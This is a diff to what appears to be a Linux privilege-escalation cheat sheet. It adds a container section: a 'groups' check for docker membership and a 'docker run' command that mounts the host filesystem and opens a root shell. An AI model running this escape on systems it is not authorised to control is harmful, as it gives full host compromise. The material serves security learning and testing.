@@ -85,9 +85,11 @@ credentials or allow tampering
 > Lists Linux capabilities assigned to binaries. Certain capabilities (e.g., cap_setuid ) can lead to root access without SUID.
 
 ## 9. Containers (Docker / LXC)
+` groups `
+> Checks if the user belongs to the docker group. Docker group membership effectively grants root access.
 
-
-
+` docker run -v /:/mnt --rm -it alpine chroot /mnt sh `
+> Mounts the host filesystem inside a container and spawns a root shell, allowing full host compromise.
 
 
 
